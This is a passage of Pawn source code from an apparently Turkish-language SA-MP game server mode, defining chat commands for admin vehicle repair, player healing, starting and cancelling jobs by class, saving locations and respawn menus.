				if(AConvoys[pConvoy][ConvoyStep] == 0 || AConvoys[pConvoy][ConvoyStep] == 1)
				{
				    SendClientMessage(playerid, -1, "Konvoy lideriniz görevi baþlatmadan bu komutu kullanamazsýnýz!");
				    return 1;
				}
			}
		}
	*/
		// Setup some local variables
		new Float:x = 0.0, Float:y = 0.0, Float:z = 0.0;
		// Check if the player is inside a vehicle
		if(IsPlayerInAnyVehicle(playerid))
			SetCameraBehindPlayer(playerid);
		// Get the player's position
		GetPlayerPos(playerid, x, y, z);
		// Set the vehicle on the player's coordinates
		SetVehiclePos(GetPlayerVehicleID(playerid), x, y, z+3);
		// Let the vehicle point north
		SetVehicleZAngle(GetPlayerVehicleID(playerid), 0.0);
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Repairs the player's vehicle
CMD:atamir(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/atamir", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
		    // Check if the player is inside a vehicle
			if(!IsPlayerInAnyVehicle(playerid))
				return SendClientMessage(playerid, 0xFF0000FF, "Bir Arac Ýcerisinde Degilsiniz."); // Let the player know he's not inside a vehicle and let the server know that this was a valid command
			// Fully repair the vehicle (damage value and bodywork)
			RepairVehicle(GetPlayerVehicleID(playerid));
			// Send the player a message to inform him that his vehicle has been repaired
			SendClientMessage(playerid, 0x00FF00FF, "Admin Olarak Bu Aracý Tamir Ettiniz.");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

//ALocations[APlayerData[playerid][JobLoc1]][LocX];

CMD:mesafe(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/mesafe", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		new Float: fDistance = GetPlayerDistanceFromPoint(playerid, ALocations[APlayerData[playerid][JobLoc1]][LocX], ALocations[APlayerData[playerid][JobLoc1]][LocY],ALocations[APlayerData[playerid][JobLoc1]][LocZ]);
		new Float: fDistance1 = GetPlayerDistanceFromPoint(playerid,ALocations[APlayerData[playerid][JobLoc2]][LocX], ALocations[APlayerData[playerid][JobLoc2]][LocY], ALocations[APlayerData[playerid][JobLoc2]][LocZ]);
        new szMessage[255];
		new szMessage1[255];
        format(szMessage, sizeof(szMessage), "Yukleme Noktasina Uzaklýgýnýz : %0.2f ", fDistance);
        format(szMessage1, sizeof(szMessage1), "Bosaltma Noktasina Uzaklýgýnýz : %0.2f ", fDistance1);
        SendClientMessage(playerid, 0xA9C4E4FF, szMessage);
        SendClientMessage(playerid, 0xA9C4E4FF, szMessage1);
	}

	// Let the server know that this was a valid command
	return 1;
}

// Repairs all vehicles
CMD:aftamir(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/aftamir", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1)
		{
			// Loop through all vehicles
			for (new i; i < 2000; i++)
				RepairVehicle(i); // Fully repair the vehicle (damage value and bodywork)

			// Send all players a message to inform them that all vehicles have been repaired
			SendClientMessageToAll(0x00FF00FF, "Yetkili Admin Tüm Araclari Tamir Etti.");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Heals all players
CMD:cantazele(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/cantazele", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 2)
		{
			// Loop through all players
			for (new i; i < MAX_PLAYERS; i++)
				if (IsPlayerConnected(i)) // Check if the player is connected
				        SetPlayerHealth(i, 100.0); // Heal the player

			// Send all players a message to inform them that all players have been healed
			SendClientMessageToAll(0x00FF00FF, "Yetkili Herkezin Canýný Tazeledi.");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Kills the player
CMD:kill(playerid, params[])
{
	SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}/meslek {80FFFF}komutu olarak kullanýlmaktadýr.");

/*
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/kill", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player has a wanted level of less than 3
		if (APlayerData[playerid][PlayerWanted] < 3)
		{
			// Check if the player isn't in jail
			if (APlayerData[playerid][PlayerJailed] == 0)
			{
			    // Force the player back into class-selection
				ForceClassSelection(playerid);
				// Kill the player (required after ForceClassSelection)
				SetPlayerHealth(playerid, 0.0);
			}
			else
			{
			    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken bu komutu kullanamazsýnýz");
			}
		}
		else
		{
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken bu komutu kullanamazsýnýz");
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Eðer oyunda polis yoksa /karakol yazýp karakollardan birinde ceza ödeyin");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	*/
	return 1;
}

// Lets the player choose another class
CMD:reclass(playerid, params[])
{
	SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}/meslek {80FFFF}komutu olarak kullanýlmaktadýr.");
/*	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/reclass", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player has a wanted level of less than 3
		if (APlayerData[playerid][PlayerWanted] < 3)
		{
			// Check if the player isn't in jail
			if (APlayerData[playerid][PlayerJailed] == 0)
			{
			    // Force the player back into class-selection
				ForceClassSelection(playerid);
				// Kill the player (required after ForceClassSelection)
				SetPlayerHealth(playerid, 0.0);
				if(APlayerData[playerid][JobStarted] == true) FailJob(playerid);
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken bu komutu kullanamazsýnýz");
		}
		else
		{
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken bu komutu kullanamazsýnýz");
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Eðer oyunda polis yoksa /karakol yazýp karakollardan birinde ceza ödeyin");
		}
	}
	else
	    return 0;
*/
	// Let the server know that this was a valid command
	return 1;
}

// Starts a job
CMD:work(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/work", params);
	if(bakimvar == 1 && APlayerData[playerid][PlayerLevel] <=0 && Root[playerid] <= 0) { SendClientMessage(playerid,-1,"{00FF00} Server BAKIM Modunda ! Gorev Yapamazsýnýz "); return 0; }

	SendClientMessage(playerid, -1, "{F8F8FF}Görev aldýðýnýzda görevi iptal etmek isterseniz {FF0000}/goreviptal");


	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    // First check if the player already has a job
		if (APlayerData[playerid][JobStarted] == false && SakliKasaTasiyor[playerid] == 0)
		{
		    // Check the player's class
			switch (APlayerData[playerid][PlayerClass])
			{
				case ClassTruckDriver:
				{
					// Get the id of the convoy (if the player is in a convoy)
					new Convoy = APlayerData[playerid][ConvoyID];

					// Check if the player is part of a convoy AND is not the leader
					if ((APlayerData[playerid][InConvoy] == true) && (AConvoys[Convoy][Members][0] != playerid))
					{
						// Let the player know he's not the leader of his convoy and cannot start a job
						SendClientMessage(playerid, 0xFF0000FF, "Konvoy lideri deðilsin, görev baþlatamazsýn");
						// Exit the function
						return 1;
					}

					if(APlayerData[playerid][InConvoy] == true)
					{
					    if(Convoy_CountMembers(APlayerData[playerid][ConvoyID]) == 1)
					    {
							// Let the player know he's not the leader of his convoy and cannot start a job
							SendClientMessage(playerid, 0xFF0000FF, "Tek baþýnýza konvoy görevi yapamazsýnýz");
							// Exit the function
							return 1;
					    }
					}

					// A convoy-leader proceeds here, and also a normal player (no convoy-member)

					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid trucking vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleFlatbed, VehicleDFT30, VehicleCementTruck: // Flatbed, DFT-30, CementTruck
								if (APlayerData[playerid][TruckerLicense] == 1) // Check if the player has acquired a truckers license
									ShowPlayerDialog(playerid, DialogTruckerJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Yükünü ve Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");
								else
								    Trucker_StartRandomJob(playerid); // Start a randomjob

							case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // Player is driving a truck which needs a trailer
								if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) // Check if there is a trailer attached
									if (APlayerData[playerid][TruckerLicense] == 1) // Check if the player has acquired a truckers license
										ShowPlayerDialog(playerid, DialogTruckerJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Yükünü ve Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");
									else
									    Trucker_StartRandomJob(playerid); // Start a random job
								else
								    SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için dorseye ihtiyacýnýz var");

							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için týra ihtiyacýnýz var");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için bir kamyona veya týra ihtiyacýnýz var");
				}
				case ClassBusDriver:
				{
				    // Get the id of the convoy (if the player is in a convoy)
					new Convoy = APlayerData[playerid][ConvoyID];

					// Check if the player is part of a convoy AND is not the leader
					if ((APlayerData[playerid][InConvoy] == true) && (AConvoys[Convoy][Members][0] != playerid))
					{
						// Let the player know he's not the leader of his convoy and cannot start a job
						SendClientMessage(playerid, 0xFF0000FF, "Konvoy lideri deðilsin, görev baþlatamazsýn");
						// Exit the function
						return 1;
					}

					if(APlayerData[playerid][InConvoy] == true)
					{
					    if(Convoy_CountMembers(APlayerData[playerid][ConvoyID]) == 1)
					    {
							// Let the player know he's not the leader of his convoy and cannot start a job
							SendClientMessage(playerid, 0xFF0000FF, "Tek baþýnýza konvoy görevi yapamazsýnýz");
							// Exit the function
							return 1;
					    }
					}

					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid bus driving vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleCoach: // Coach
								if (APlayerData[playerid][BusLicense] == 1) // Check if the player has acquired a bus driver license
									ShowPlayerDialog(playerid, DialogBusJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");
								else
								    BusDriver_StartRandomJob(playerid); // Start a randomjob

							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için Coach'a ihtiyacýnýz var");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için bir Coach'a ihtiyacýnýz var");
				}
				case ClassDolmusDriver:
				{
					if (GetPlayerVehicleSeat(playerid) == 0)
						if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleCamper)
       						if (APlayerData[playerid][DolmusLicense] == 1)
								ShowPlayerDialog(playerid, DialogDolmusJobMethod, DIALOG_STYLE_LIST, "Secim:", "Kendi yolcunu ve rotani secmek.\r\nOtomatik yolcu ve rota.", "Sec", "iptal");
							else
								DolmusDriver_StartJob(playerid, random(sizeof(ADolmusRoutes)));
						else
			                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için mafya aracýna binmelisiniz");
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için mafya aracýna binmelisiniz");
				}
				case ClassPilot:
				{
					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid piloting vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleShamal, VehicleNevada, VehicleMaverick, VehicleCargobob, VehicleAndromada, VehicleAT400: { // Plane (Shamal), Plane (Nevada), helicopter (Maverick)
								if (APlayerData[playerid][PilotLicense] == 1) // Check if the player has acquired a truckers license
								{
									ShowPlayerDialog(playerid, DialogPilotJobMethod, DIALOG_STYLE_LIST, "Secenekler:", "Kendi yükünü sec\r\nOtomatik Görev", "Sec", "Iptal");
              					}else{
									Pilot_StartRandomJob(playerid); // Start a random piloting job
									PilotUcak[playerid] = GetPlayerVehicleID(playerid);
								}
							}
							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için bir hava aracýna binmelisiniz");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için uçaða binmelisiniz");
				}
				case ClassMafia:
				{
					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid piloting vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleSandKing, VehicleMoonbeam: // Sangking, Moonbeam
							if (APlayerData[playerid][MafiaLicense] == 1) // Check if the player has acquired a Gemici license
									ShowPlayerDialog(playerid, DialogMafiaJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");
								else
								Mafia_StartRandomJob(playerid); // Start a random mafia job
							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için mafya aracýna binmelisiniz");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için mafya aracýna binmelisiniz");
				}

				case ClassRoadWorker:
				{
					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid towing vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleUtilityVan, VehicleTowTruck: // Utility Van, Towtruck
								Roadworker_StartRandomJob(playerid); // Start a random roadworker job
							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için yoliþçisi aracýna binmelisiniz");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için yoliþçisi aracýna binmelisiniz");
				}

				case ClassGemici:
				{
					// Check if the player is the driver of a vehicle
					if (GetPlayerVehicleSeat(playerid) == 0)
					{
						// Check if the player is inside a valid bus driving vehicle
						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case VehicleJetmax, VehicleMarquis, VehicleSpeeder, VehicleSquallo, VehicleTropic:
							{
								if (APlayerData[playerid][GemiciLicense] == 1) // Check if the player has acquired a Gemici license
									ShowPlayerDialog(playerid, DialogGemiciJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");
								else
								    Gemici_StartRandomJob(playerid); // Start a randomjob
							}
							default: SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için Jetmax, Marquis, Speeder, Squallo veya Tropic tekneye ihtiyacýnýz var");
						}
					}
					else
		                SendClientMessage(playerid, 0xFF0000FF, "Görev baþlatmak için Jetmax, Marquis, Speeder, Squallo veya Tropic tekneye ihtiyacýnýz var");
				}

 				case ClassOduncu:
				{
					Oduncu_StartKesim(playerid);
				}

				case ClassBalikci:
				{
				    Balikci_StartMission(playerid);
				}
				case ClassCopcu:
				{
                    StartCopcuGorev(playerid);
				}
				case ClassKargocu:
				{
    				if(GetPlayerBolge(playerid) != 1) return Hata(playerid, "Bu meslekte sadece Los Santos ve San Fierro'da görev alabilirsiniz!");
	        		StartKargocuGorev(playerid);
				}
				case ClassBanka:

				{

					// Check if the player is the driver of a vehicle

					if (GetPlayerVehicleSeat(playerid) == 0)

					{

						// Check if the player is inside a valid  vehicle

						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

						{

							case VehicleSecuricar:

								Banka_StartRandomJob(playerid); // Start a random G job

							default: SendClientMessage(playerid, 0xFF0000FF, "Banka Aracin icinde olmalisiniz");

						}

					}

					else

		                SendClientMessage(playerid, 0xFF0000FF, "Banka Aracin icinde olmalisiniz");

				}
				case ClassPboy:
				{

					// Check if the player is the driver of a vehicle

					if (GetPlayerVehicleSeat(playerid) == 0)

					{

						// Check if the player is inside a valid Pizza Boy vehicle

						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

						{

							case VehiclePboy, VehicleBenson: //

								Pboy_StartJob(playerid); // Start a random Pizza Boy job

							default: SendClientMessage(playerid, 0xFF0000FF, "Pizza dagitmak icin Pizza motoru veya benson aracinda olmalisin");

						}

					}

					else

		                SendClientMessage(playerid, 0xFF0000FF, "Görevi baslatmak icin Pizza motoru gerek");
				}
				case ClassFire:

				{

					// Check if the player is the driver of a vehicle

					if (GetPlayerVehicleSeat(playerid) == 0)

					{

						// Check if the player is inside a valid  vehicle

						switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

						{

							case VehicleFiretruck:

								Fire_StartRandomJob(playerid); // Start a random G job

							default: SendClientMessage(playerid, 0xFF0000FF, "Itfaiye Aracin icinde olmalisiniz");

						}

					}

					else

		                SendClientMessage(playerid, 0xFF0000FF, "Itfaiye Aracin icinde olmalisiniz");

				}

				default: SendClientMessage(playerid, 0xFF0000FF, "Sýnýfýnýz hiçbir iþ yapamaz");
			}

		}
		else // Send a message to let the player know he already has a job
		    SendClientMessage(playerid, 0xFF0000FF, "Zaten görevdesiniz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Stops the current job
CMD:goreviptal(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/goreviptal", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    // Check if the player has a job started
		if (APlayerData[playerid][JobStarted] == true)
		{
		    // Check the class of the player
			switch (APlayerData[playerid][PlayerClass])
			{
				case ClassTruckDriver: Trucker_EndJob(playerid); // Stop any trucker job
 				case ClassBusDriver: BusDriver_EndJob(playerid); // Stop any trucker job
				case ClassPilot: Pilot_EndJob(playerid); // Stop any pilot job
				case ClassMafia: Mafia_EndJob(playerid); // Stop any mafia job
				case ClassRoadWorker: Roadworker_EndJob(playerid);
				case ClassDolmusDriver: DolmusDriver_EndJob(playerid);
				case ClassCopcu:
				{
  					SendClientMessage(CopOrtak[playerid], -1, "{00FF00}Ortaðýnýz görevi iptal etti!");

	        		StopCopcuGorev(playerid);
				}
				case ClassKargocu:
				{
 					if(KargoOrtak[playerid] != -1)
      				{
						SendClientMessage(KargoOrtak[playerid], -1, "{00FF00}Ortaðýnýz görevi iptal etti!");
					}

     				StopKargocuGorev(playerid);
				}
				case ClassBanka: Banka_EndJob(playerid);
				case ClassFire: Fire_EndJob(playerid);
				case ClassPboy: Pboy_EndJob(playerid);
  				case ClassGemici: Gemici_EndJob(playerid);
  				case ClassOduncu: { Oduncu_EndJob(playerid); return 1; }
  				case ClassBalikci: { Balikci_EndJob(playerid); return 1; }
				default: SendClientMessage(playerid, 0xFF0000FF, "Ýptal Edilecek Ýþ Bulunamadi");
			}

			// Inform the player that he failed the mission
		//	GameTextForPlayer(playerid, "~w~You ~r~failed~w~ your mission. You lost ~y~$1000~w~ to cover expenses.", 5000, 4);
			// Reduce the player's cash by 1000
			SendClientMessage(playerid,-1," Görevinizi Ýptal Ettiginiz $1000 Kaybettiniz ");
			RewardPlayer(playerid, -1000, 0);
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Displays the player's coordinates on the map
CMD:loc(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/loc", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
		    // Setup some local variables
			new Message[200], Float:x, Float:y, Float:z, Float:rot, Interior, World;
			// Get the player's position
			GetPlayerPos(playerid, x, y, z);
			// Check if the player is on foot or in a vehicle
			if (GetPlayerVehicleSeat(playerid) == -1)
				GetPlayerFacingAngle(playerid, rot); // Get the player's angle
			else
			    GetVehicleZAngle(GetPlayerVehicleID(playerid), rot);

			// Get the interior where the player is located
			Interior = GetPlayerInterior(playerid);
			// Get the virtual world of the player
			World = GetPlayerVirtualWorld(playerid);
			// combine the position and angle into a proper message
		    format(Message, sizeof(Message), "Location: X=%4.2f, Y=%4.2f, Z=%4.2f, rotation=%4.2f, interior=%i, world=%i", x, y, z, rot, Interior, World);
		    // Send the message with the coordinates and the angle of the player
			SendClientMessage(playerid, 0xFF0000AA, Message);
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Saves the location into a file
CMD:saveloc(playerid, params[])
{
	new File:LocFile, LineForFile[255], LineMsg[255];
	new Float:x, Float:y, Float:z, LocatName[255], ID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/saveloc", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "is[255]", ID, LocatName)) SendSyntaxMessage(playerid, "/saveloc <ID> <Location Name>");
			else
			{
				if (!fexist("ServerData/Locations.txt"))
				{
				    LocFile = fopen("ServerData/Locations.txt", io_write); // Create the file
					fclose(LocFile); // Close the file
				}

				// Get the player's position
				GetPlayerPos(playerid, x, y, z);
				// Combine all the data in a proper structure, so it can be used directly for setting up the ALocations array
			    format(LineForFile, sizeof(LineForFile), "\t{\"%s\", %4.2f, %4.2f, %4.2f}, // ID = %i", LocatName, x, y, z, ID);

				LocFile = fopen("ServerData/Locations.txt", io_append); // Open the locationfile for appending data to it
				fwrite(LocFile, LineForFile); // Append the data to the end of the file
				fwrite(LocFile, "\r\n"); // Start a new line, or all the data is saved in one line
				fclose(LocFile); // Close the file

				// Let the player know what data has been saved
				format(LineMsg, 255, "Data has been saved: %s", LineForFile);
				SendClientMessage(playerid, 0x808080FF, LineMsg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Lets the player choose where he wants to respawn (costs $200)
CMD:rescue(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/rescue", params);

	// Ahýr Sistemi & Animasyonlar
	if(AhirKurban[playerid] != -1) return 0;

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player has a wanted level of less than 3
		if (APlayerData[playerid][PlayerWanted] < 3)
		{
			// Check if the player isn't in jail
			if (APlayerData[playerid][PlayerJailed] == 0)
			{
				if (APlayerData[playerid][JobStarted] == false)
				{
					// Make sure you can't use "/rescue" when you're inside a vehicle (doesn't respawn you at the requested coords
					// and puts a random item (bottle, sigarette, ...) in the player's hands
					if (GetPlayerVehicleID(playerid) == 0)
					{
					    // Create a dialog based on the player's class
						switch (APlayerData[playerid][PlayerClass])
						{
							/*case ClassTruckDriver: // Ask where the trucker player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Choose trucker spawn point:", "Fallen Tree Depot\r\nFlint Trucking Depot\r\nLVA Freight Depot\r\nDoherty Depot\r\nEl Corona Depot\r\nLas Payasdas Depot\r\nQuarry Top\r\nShady Creek Depot", "Spawn", "Cancel");
							*/
							case ClassTruckDriver: // Ask where the trucker player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Fallen Tree (near SF)\r\n{FF0000}»{FFFFFF} Countryside\r\n{FF0000}»{FFFFFF} Las Venturas\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} LV Mountains\r\n{FF0000}»{FFFFFF} Quarry LV\r\n{FF0000}»{FFFFFF} Highway LS-SF\r\n{FF0000}»{FFFFFF} Tugis Truckstop\r\n{FF0000}»{FFFFFF} Harbour", "Git", "Iptal");
							case ClassBusDriver: // Ask where the busdriver wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Las Venturas\r\n{FF0000}»{FFFFFF}Higway (Longway Otogar)", "Git", "Iptal");
							case ClassDolmusDriver: // Ask where the busdriver wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Las Venturas", "Git", "Iptal");
							case ClassPilot: // Ask where the pilot wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Las Venturas\r\n{FF0000}»{FFFFFF} Kastamonu", "Git", "Iptal");
							case ClassPolice: // Ask where the police player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Las Venturas", "Git", "Iptal");
							case ClassGemici: // Ask where the gemici player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos Liman\r\n{FF0000}»{FFFFFF} San Fierro Liman\r\n{FF0000}»{FFFFFF} Las Venturas Liman\r\n{FF0000}»{FFFFFF} Porto Tugay", "Git", "Iptal");
       						case ClassMafia: // Ask where the gemici player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Las Venturas\r\n{FF0000}»{FFFFFF} Whetstone Mafya Yeri", "Git", "Iptal");
                            case ClassCopcu: // Ask where the pilot wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos Çöpçü Deposu\r\n{FF0000}»{FFFFFF} San Fierro Çöpçü Deposu", "Git", "Iptal");
							case ClassBanka: // Ask where the pilot wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Banka Deposu", "Git", "Iptal");
							case ClassFire: // Ask where the pilot wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Itfaiye Ussu\r\n{FF0000}»{FFFFFF} Las Venturas", "Git", "Iptal");
							case ClassFBY: // Ask where the courier player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santons\r\n{FF0000}»{FFFFFF} San Fierro\r\n{FF0000}»{FFFFFF} Las Venturas", "Git", "Iptal");
                            case ClassPboy: // Ask where the pizza player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "{FF0000}»{FFFFFF} Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF} Las Venturas\r\n{FF0000}»{FFFFFF} San Fierro", "Isinlan", "Iptal");
							case ClassOduncu: // Ask where the oduncu player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} The Panopticon", "Git", "Iptal");
							case ClassBalikci: // Ask where the gemici player wants to respawn
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos Liman\r\n{FF0000}»{FFFFFF} San Fierro Liman\r\n{FF0000}»{FFFFFF} Las Venturas Liman", "Git", "Iptal");
							case ClassKargocu:
								ShowPlayerDialog(playerid, DialogRescue, DIALOG_STYLE_LIST, "Bir Yer Secin:", "Þirkete Iþýnlan\r\n{FF0000}»{FFFFFF} Los Santos\r\n{FF0000}»{FFFFFF}San Fierro", "Git", "Iptal");
						}
					}
					else
					{
						SendClientMessage(playerid, 0xFF0000FF, "Araç içindeyken '/rescue' komutunu kullanamazsýnýz!"); // "/rescue" doesn't work inside a vehicle
					}
				}
				else
				{
